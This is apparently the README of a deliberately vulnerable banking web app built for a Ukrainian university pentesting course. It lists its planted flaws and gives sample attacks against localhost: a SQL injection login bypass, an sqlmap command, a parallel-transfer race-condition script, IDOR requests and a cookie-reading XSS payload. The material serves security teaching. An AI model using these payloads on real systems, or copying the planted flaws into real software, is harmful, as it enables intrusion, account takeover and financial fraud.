# 🏦 Vulnerable Bank - Практична робота з кібербезпеки

## 📖 Про проект

**Vulnerable Bank** - це навчальна банківська веб-аплікація з множинними вразливостями безпеки, розроблена для практичного навчання студентів спеціальності "Кібербезпека" навичкам пентестингу та аналізу безпеки фінансових систем.

### Курс
**Інформаційні банківські технології** (3 курс, Кібербезпека)

### Мета практичної роботи
- Навчитися виявляти типові вразливості в банківських системах
- Розвинути навички пентестингу веб-додатків
- Зрозуміти принципи secure coding
- Навчитися писати професійні звіти про безпеку

---

## 🎯 Завдання для студентів

### Етап 1: Reconnaissance (30 хв)
Зібрати інформацію про цільову систему:
- Визначити технологічний стек
- Знайти всі доступні endpoints
- Картування архітектури додатку

### Етап 2: Vulnerability Assessment (1-1.5 год)
Знайти мінімум **5 критичних вразливостей** з списку:
- SQL Injection
- Race Condition
- IDOR (Insecure Direct Object Reference)
- XSS (Cross-Site Scripting)
- CSRF (Cross-Site Request Forgery)
- Broken Authentication
- Information Disclosure
- Business Logic Flaws

### Етап 3: Exploitation (2-3 год)
Написати Proof-of-Concept (PoC) експлойти для знайдених вразливостей:
- Bypass authentication
- Unauthorized fund transfer
- Account takeover
- Data exfiltration

### Етап 4: Reporting (1-1.5 год)
Написати професійний звіт про безпеку згідно стандарту (шаблон надається).

---

## 🚀 Швидкий старт

### Вимоги
- Docker 20.10+
- Docker Compose 2.0+
- 2 GB вільної RAM
- Порти 5000, 8080, 3306 (вільні)

### Встановлення

```bash
# Клонувати репозиторій
git clone https://github.com/your-username/vulnerable-bank.git
cd vulnerable-bank

# Запустити систему
docker-compose up -d

# Перевірити статус
docker-compose ps

# Відкрити в браузері
http://localhost:5000
```

### Тестові акаунти

| Користувач | Пароль | Роль | Баланс |
|------------|--------|------|--------|
| `admin` | `admin123` | Адміністратор | $1,000,000 |
| `john` | `password` | Користувач | $5,000 |
| `alice` | `123456` | Користувач | $10,000 |
| `bob` | `qwerty` | Користувач | $2,500 |
| `teller1` | `teller123` | Касир | $0 |

---

## 📁 Структура проекту

```
vulnerable-bank/
├── docker-compose.yml           # Конфігурація Docker
├── webapp/                      # Flask веб-додаток
│   ├── Dockerfile
│   ├── app.py                  # Основний код (ВРАЗЛИВИЙ!)
│   ├── requirements.txt
│   ├── templates/              # HTML шаблони
│   │   ├── login.html
│   │   ├── dashboard.html
│   │   └── transfer.html
│   └── static/                 # CSS, JS
├── database/                   # MySQL база даних
│   ├── Dockerfile
│   └── init.sql               # Початкові дані
├── api/                       # REST API (Node.js)
│   ├── Dockerfile
│   ├── server.js
│   └── package.json
├── docs/                      # Документація
│   ├── VULNERABILITIES.md     # Список вразливостей
│   ├── EXPLOITS.md           # Приклади експлойтів
│   └── REPORT_TEMPLATE.md    # Шаблон звіту
└── README.md                 # Цей файл
```

---

## 🐛 Список вразливостей (спойлери!)

<details>
<summary>Клікніть, щоб побачити список вразливостей (для викладачів)</summary>

### 1. SQL Injection (CRITICAL)
- **Локація:** `/login` endpoint
- **CVSS Score:** 9.8
- **PoC:** `Username: admin' OR '1'='1' --`

### 2. Race Condition (CRITICAL)
- **Локація:** `/transfer` endpoint
- **CVSS Score:** 9.1
- **Можливість:** Negative balance через паралельні запити

### 3. IDOR (HIGH)
- **Локація:** `/account/<id>` endpoint
- **CVSS Score:** 7.5
- **Можливість:** Перегляд чужих рахунків

### 4. XSS - Reflected (MEDIUM)
- **Локація:** `/search?q=` endpoint
- **CVSS Score:** 6.1
- **PoC:** `?q=<script>alert(1)</script>`

### 5. Missing Authorization (HIGH)
- **Локація:** `/admin/users` endpoint
- **CVSS Score:** 8.2
- **Можливість:** Будь-який користувач може бачити всіх users

### 6. Weak JWT Implementation (HIGH)
- **Локація:** `/api/token` endpoint
- **CVSS Score:** 7.5
- **Слабкість:** Predictable secret key

### 7. CSRF (MEDIUM)
- **Локація:** `/change_password` endpoint
- **CVSS Score:** 6.5
- **Відсутність:** CSRF токен

### 8. Information Disclosure (MEDIUM)
- **Локація:** `/debug/env` endpoint
- **CVSS Score:** 5.3
- **Витік:** Environment variables з паролями

### 9. Insecure Password Storage (CRITICAL)
- **Локація:** Database
- **CVSS Score:** 9.8
- **Проблема:** Plain text passwords

### 10. Session Management Issues (HIGH)
- **Проблема:** Sensitive data в session cookies
- **CVSS Score:** 7.5

</details>

---

## 🛠️ Інструменти для тестування

### Рекомендовані інструменти:
- **Burp Suite Community** - Web proxy для перехоплення запитів
- **SQLMap** - Automated SQL injection
- **Postman** - API testing
- **Python Requests** - Написання custom exploits
- **Browser DevTools** - Аналіз frontend

### Встановлення інструментів (Kali Linux):

```bash
# Оновити систему
sudo apt update

# SQLMap (зазвичай вже встановлений в Kali)
sqlmap --version

# Burp Suite Community
# Завантажити з: https://portswigger.net/burp/communitydownload

# Python бібліотеки
pip3 install requests python-jwt
```

---

## 📝 Приклади тестування

### Приклад 1: SQL Injection

```bash
# Manual testing
Username: admin' OR '1'='1' --
Password: anything

# SQLMap
sqlmap -u "http://localhost:5000/login" \
  --data "username=admin&password=test" \
  --batch --dbs
```

### Приклад 2: Race Condition

```python
import requests
import threading

def transfer(session, amount):
    session.post('http://localhost:5000/transfer',
                data={'to_account': '1000000003', 'amount': amount})

# Login
s = requests.Session()
s.post('http://localhost:5000/login',
       data={'username': 'bob', 'password': 'qwerty'})

# Запустити 100 паралельних трансферів по $100
threads = []
for i in range(100):
    t = threading.Thread(target=transfer, args=(s, 100))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

print("Attack completed! Check if balance went negative.")
```

### Приклад 3: IDOR

```bash
# Перегляд свого рахунку (ID=2, john)
curl -b cookies.txt http://localhost:5000/account/2

# Спроба переглянути чужий рахунок (ID=3, alice)
curl -b cookies.txt http://localhost:5000/account/3
# Якщо вразливий - покаже дані alice!
```

### Приклад 4: XSS

```
1. Відкрити: http://localhost:5000/search?q=<script>alert(document.cookie)</script>
2. Якщо вразливий - побачите alert з cookies
```

---

## 📊 Критерії оцінювання

| Критерій | Бали | Опис |
|----------|------|------|
| **Reconnaissance** | 10% | Повнота зібраної інформації (nmap, gobuster, whatweb) |
| **Vulnerability Discovery** | 30% | Кількість та якість знайдених вразливостей (мінімум 5) |
| **Exploitation** | 25% | Успішні PoC експлойти з доказами (screenshots, code) |
| **Post-Exploitation** | 15% | Демонстрація реального впливу (data exfiltration) |
| **Report Quality** | 20% | Професійність звіту, CVSS scoring, remediation план |

### Градація оцінок:
- **90-100%** (Відмінно) - Знайдено 8+ вразливостей, PoC для всіх, відмінний звіт
- **75-89%** (Добре) - Знайдено 5-7 вразливостей, PoC для більшості, добрий звіт
- **60-74%** (Задовільно) - Знайдено 3-5 вразливостей, базові PoC, прийнятний звіт
- **<60%** (Незадовільно) - <3 вразливостей або відсутність PoC/звіту

---

## 📚 Шаблон звіту

Звіт має включати наступні секції:

```markdown
# Penetration Testing Report
## Vulnerable Bank Security Assessment

### 1. Executive Summary
[Короткий опис для керівництва - 1 абзац]

### 2. Scope
- Target: http://localhost:5000
- Testing Period: [dates]
- Methodology: OWASP Testing Guide

### 3. Findings Summary
- Total vulnerabilities: X
- Critical: X
- High: X
- Medium: X
- Low: X

### 4. Detailed Findings

#### Finding 1: SQL Injection
**Severity:** Critical (CVSS 9.8)
**Location:** /login endpoint
**Description:** [детальний опис]
**Proof of Concept:**
[код/screenshots]
**Impact:** [вплив на бізнес]
**Remediation:** [як виправити]

[... інші вразливості ...]

### 5. Risk Matrix
[таблиця ризиків]

### 6. Recommendations
- Immediate (0-30 days)
- Short-term (1-3 months)
- Long-term (3-12 months)

### 7. Appendices
- Tools used
- Scan outputs
- Exploit code
```

Повний шаблон доступний у файлі `docs/REPORT_TEMPLATE.md`

---

## 🎓 Для викладачів

### Розгортання для класу

#### Варіант 1: Кожен студент локально
```bash
# Студенти клонують і запускають на своїх машинах
git clone <repo>
docker-compose up -d
```

**Переваги:**
- Ізоляція
- Немає навантаження на сервер
- Можна експериментувати

**Недоліки:**
- Потрібен Docker на кожній машині
- Споживає ресурси локально

#### Варіант 2: Централізований сервер

```bash
# На сервері викладача
for i in {1..30}; do
    port=$((5000 + i))
    db_port=$((3306 + i))

    mkdir student_$i
    cd student_$i

    # Модифікувати docker-compose.yml для унікальних портів
    cat > docker-compose.yml <<EOF
version: '3.8'
services:
  db:
    image: mysql:8.0
    ports:
      - "${db_port}:3306"
    # ... решта конфігурації
  webapp:
    ports:
      - "${port}:5000"
    # ... решта конфігурації
EOF

    docker-compose up -d
    cd ..
done

# Студент 1: http://server-ip:5001
# Студент 2: http://server-ip:5002
# ...
```

**Переваги:**
- Централізоване управління
- Моніторинг прогресу
- Однакове середовище

**Недоліки:**
- Потребує потужний сервер
- Складніша конфігурація

### Моніторинг прогресу студентів

```bash
# Переглянути логи всіх студентів
for i in {1..30}; do
    echo "=== Student $i ==="
    docker-compose -f student_$i/docker-compose.yml logs webapp | grep "SQL Injection detected"
done
```

### Скидання середовища між заняттями

```bash
# Зупинити всі контейнери
docker-compose down -v

# Видалити всі дані
rm -rf mysql_data/

# Перезапустити
docker-compose up -d
```

---

## 🔒 Безпека

### Важливо!

1. **НЕ відкривайте цю систему в інтернет!**
   - Використовуйте тільки в ізольованій мережі
   - Firewall має блокувати зовнішній доступ

2. **НЕ використовуйте реальні дані**
   - Всі паролі, номери рахунків - тестові
   - Немає жодних реальних банківських даних

3. **Етичні правила для студентів:**
   - Тестувати ТІЛЬКИ надану систему
   - НЕ атакувати реальні банки
   - НЕ використовувати навички для зловмисних цілей

### Ізоляція мережі

```bash
# Docker network (вже ізольована за замовчуванням)
docker network ls | grep vulnerable-bank

# Додатково: firewall rules
sudo ufw deny from any to any port 5000
sudo ufw allow from 192.168.1.0/24 to any port 5000
```

---

## 🐞 Troubleshooting

### Проблема: Порти зайняті
```bash
# Знайти процес на порту 5000
sudo lsof -i :5000

# Вбити процес
kill -9 <PID>

# Або змінити порт у docker-compose.yml
ports:
  - "5001:5000"  # Змінити з 5000 на 5001
```

### Проблема: База даних не стартує
```bash
# Перевірити логи
docker-compose logs db

# Видалити старі дані
docker-compose down -v
rm -rf mysql_data/

# Перезапустити
docker-compose up -d
```

### Проблема: Webapp не підключається до DB
```bash
# Перевірити мережу
docker network inspect vulnerable-bank_bank_network

# Перевірити чи DB готова
docker exec vulnerable_bank_db mysql -uroot -proot -e "SHOW DATABASES;"

# Перезапустити webapp
docker-compose restart webapp
```

---

## 📖 Додаткові ресурси

### Навчальні матеріали:
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTheBox](https://www.hackthebox.com/)

### Подібні проекти:
- [DVWA (Damn Vulnerable Web Application)](https://github.com/digininja/DVWA)
- [WebGoat](https://github.com/WebGoat/WebGoat)
- [Juice Shop](https://github.com/juice-shop/juice-shop)

### CVSS Калькулятор:
- [FIRST CVSS Calculator](https://www.first.org/cvss/calculator/3.1)

---

## 🤝 Contribution

Якщо ви знайшли баг або хочете додати нову вразливість:

1. Fork репозиторій
2. Створіть feature branch (`git checkout -b feature/new-vulnerability`)
3. Commit зміни (`git commit -m 'Add SQL injection in API'`)
4. Push to branch (`git push origin feature/new-vulnerability`)
5. Створіть Pull Request

---

## 📜 Ліцензія

MIT License - використовуйте вільно для освітніх цілей.

**Disclaimer:** Автори не несуть відповідальності за зловмисне використання цього коду. Призначено виключно для навчання.

---

## 👨‍🏫 Автори

- **Викладач:** [Ваше ім'я]
- **Університет:** [Назва університету]
- **Курс:** Інформаційні банківські технології
- **Рік:** 2025

---

## 📞 Контакти

Питання? Проблеми? Зв'яжіться:
- Email: [your-email@university.edu]
- GitHub Issues: [create issue](https://github.com/your-username/vulnerable-bank/issues)

---

## ⭐ Star History

Якщо цей проект був корисним, поставте зірку на GitHub! ⭐

---

**Happy Hacking! 🏴‍☠️** (У навчальних цілях, звичайно 😉)
